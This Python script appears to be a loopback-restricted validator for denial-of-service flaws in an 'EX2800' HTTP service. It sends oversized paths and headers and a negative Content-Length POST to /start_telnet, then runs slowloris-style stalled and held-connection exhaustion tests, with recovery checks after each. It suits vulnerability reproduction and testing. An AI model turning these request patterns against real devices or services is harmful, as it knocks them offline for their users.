#!/usr/bin/env python3
"""Bounded, loopback-only EX2800 HTTP denial-of-service validator."""

import argparse
import ipaddress
import socket
import time


def loopback(value: str) -> str:
    try:
        address = ipaddress.ip_address(socket.gethostbyname(value))
    except (ValueError, socket.gaierror) as exc:
        raise argparse.ArgumentTypeError(f"invalid target: {exc}") from exc
    if not address.is_loopback:
        raise argparse.ArgumentTypeError("target must resolve to loopback")
    return str(address)


def exchange(target: str, port: int, request: bytes, timeout: float = 1.0) -> bytes:
    with socket.create_connection((target, port), timeout=timeout) as client:
        client.settimeout(timeout)
        client.sendall(request)
        chunks = []
        try:
            while True:
                chunk = client.recv(4096)
                if not chunk:
                    break
                chunks.append(chunk)
        except socket.timeout:
            pass
        return b"".join(chunks)


def healthy(target: str, port: int) -> bool:
    try:
        response = exchange(
            target,
            port,
            b"GET / HTTP/1.0\r\nHost: localhost\r\nConnection: close\r\n\r\n",
            1.0,
        )
        return response.startswith(b"HTTP/")
    except OSError:
        return False


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", type=loopback, default="127.0.0.1")
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument("--connections", default="16,32,64,96,128")
    args = parser.parse_args()

    print(f"baseline_healthy={str(healthy(args.target, args.port)).lower()}")
    cases = {
        "path_8k": b"GET /" + b"A" * 8192 + b" HTTP/1.0\r\n\r\n",
        "path_32k": b"GET /" + b"A" * 32768 + b" HTTP/1.0\r\n\r\n",
        "header_32k": (
            b"GET / HTTP/1.0\r\nHost: localhost\r\nX-Fill: "
            + b"B" * 32768
            + b"\r\n\r\n"
        ),
        "negative_content_length": (
            b"POST /start_telnet HTTP/1.0\r\nHost: localhost\r\n"
            b"Content-Length: -1\r\n\r\n"
        ),
    }

    persistent = False
    for name, request in cases.items():
        try:
            exchange(args.target, args.port, request)
        except OSError:
            pass
        time.sleep(0.2)
        recovered = healthy(args.target, args.port)
        print(f"{name}_service_recovered={str(recovered).lower()}")
        persistent |= not recovered

    stalled = socket.create_connection((args.target, args.port), timeout=1)
    stalled.sendall(b"GET / HTTP/1.0\r\nHost: localhost\r\nX-Stall: ")
    time.sleep(0.2)
    starvation = not healthy(args.target, args.port)
    print(f"single_stalled_client_starves_service={str(starvation).lower()}")
    stalled.close()
    time.sleep(0.3)
    post_stall_recovery = healthy(args.target, args.port)
    print(f"service_recovers_after_stall={str(post_stall_recovery).lower()}")
    persistent |= not post_stall_recovery

    levels = sorted({
        max(1, min(int(item), 512))
        for item in args.connections.split(",")
        if item.strip()
    })
    first_exhausted = None
    for level in levels:
        held = []
        for _ in range(level):
            try:
                client = socket.create_connection(
                    (args.target, args.port), timeout=0.2
                )
                client.sendall(b"GET / HTTP/1.0\r\nX-Hold: ")
                held.append(client)
            except OSError:
                break
        exhaustion = not healthy(args.target, args.port)
        if exhaustion and first_exhausted is None:
            first_exhausted = len(held)
        print(f"connections_{level}_held={len(held)}")
        print(f"connections_{level}_exhausted={str(exhaustion).lower()}")
        for client in held:
            client.close()
        time.sleep(0.5)
        recovered = healthy(args.target, args.port)
        print(f"connections_{level}_recovered={str(recovered).lower()}")
        persistent |= not recovered
    print(
        "first_bounded_exhaustion="
        + (str(first_exhausted) if first_exhausted is not None else "none")
    )

    print(f"persistent_dos_reproduced={str(persistent).lower()}")
    return 1 if persistent else 0


if __name__ == "__main__":
    raise SystemExit(main())
